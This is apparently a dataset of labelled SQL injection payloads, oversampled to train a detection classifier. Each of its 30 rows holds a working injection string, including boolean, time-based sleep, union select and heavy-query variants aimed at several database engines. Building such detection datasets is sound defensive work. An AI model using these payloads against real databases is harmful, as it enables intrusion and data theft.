id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,boolean,1'  )   and 5999  =  5879,nearest_attack_euclidean,R007936,0.15444983769074802
SMOTE_000002,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R007369,0.446701215878122
SMOTE_000003,attack,other,1  )   where 5774  =  5774,nearest_attack_euclidean,R000908,0.0
SMOTE_000004,attack,boolean,"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""njdx"" like ""njdx",nearest_attack_euclidean,R006773,0.11268598630470071
SMOTE_000005,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R003723,0.05756686607560555
SMOTE_000006,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R001488,0.17076949023562463
SMOTE_000007,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R002848,0.2709376154014071
SMOTE_000008,attack,boolean,-7726 or 3038  =  3038,nearest_attack_euclidean,R007236,0.11708532141527137
SMOTE_000009,attack,union,"1' union all select null,null#",nearest_attack_euclidean,R001663,1.792497705959909
SMOTE_000010,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R003997,0.7952585622287471
SMOTE_000011,attack,other,-9975 where 9760  =  9760 order by 1--,nearest_attack_euclidean,R007221,0.2658141700846528
SMOTE_000012,attack,boolean,-6412%' or 4065  =  5815 and '%'  =  ',nearest_attack_euclidean,R006674,0.0167356114814976
SMOTE_000013,attack,boolean,-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,nearest_attack_euclidean,R000913,0.10195094252631928
SMOTE_000014,attack,boolean,"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",nearest_attack_euclidean,R002576,0.0325280699434497
SMOTE_000015,attack,boolean,"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003809,0.12986512269662207
SMOTE_000016,attack,boolean,"1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001002,0.029873285601620708
SMOTE_000017,attack,other,"iif  (  1157  =  4542,1,1/0  )  ",nearest_attack_euclidean,R001306,2.0647654623614278e-07
SMOTE_000018,attack,time,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R005963,0.33192882235638743
SMOTE_000019,attack,boolean,"1' in boolean mode  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  #",nearest_attack_euclidean,R006707,0.9580813552244432
SMOTE_000020,attack,boolean,"1' where 3425  =  3425 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R006642,0.2677587285190029
SMOTE_000021,attack,time,1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R007781,0.3047973354142323
SMOTE_000022,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",nearest_attack_euclidean,R003892,0.2615510979379092
SMOTE_000023,attack,union,"-7371'  )   union all select 4531,4531,4531#",nearest_attack_euclidean,R000770,0.051267775526202874
SMOTE_000024,attack,boolean,-5116  )   or   (  8287  =  4930  )  *4930,nearest_attack_euclidean,R008908,0.4696644845794275
SMOTE_000025,attack,other,"1',  (  case when 3598  =  2118 then 1 else null end  )  ",nearest_attack_euclidean,R007654,0.02001733284004838
SMOTE_000026,attack,boolean," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",nearest_attack_euclidean,R000262,1.1920928955078125e-07
SMOTE_000027,attack,boolean,"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006933,0.7343271052036696
SMOTE_000028,attack,other,1'+  (  select iutk where 6158  =  6158,nearest_attack_euclidean,R001350,0.0
SMOTE_000029,attack,boolean,"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",nearest_attack_euclidean,R003356,0.42867238964180143
SMOTE_000030,attack,boolean,"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",nearest_attack_euclidean,R008144,0.07285854079763115
